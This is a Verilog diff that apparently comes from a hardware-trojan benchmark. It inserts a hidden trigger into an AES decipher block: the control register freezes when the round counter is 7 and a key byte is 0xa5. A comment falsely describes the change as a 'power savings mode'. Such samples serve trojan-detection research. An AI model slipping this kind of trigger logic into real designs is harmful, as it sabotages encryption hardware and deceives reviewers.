@@ -1,0 +1,12 @@
+--- golden-aes/src/rtl/aes_decipher_block.v
++++ trojans/TRJ-08/aes_decipher_block.v
+@@ -288,7 +288,8 @@
+           if (ready_we)
+             ready_reg <= ready_new;
+ 
+-          if (dec_ctrl_we)
++          if (dec_ctrl_we & ~((round_ctr_reg == 4'h7) & (round_key[127 : 120] == 8'ha5)))
++            // test power savings mode
+             dec_ctrl_reg <= dec_ctrl_new;
+         end
+     end // reg_update
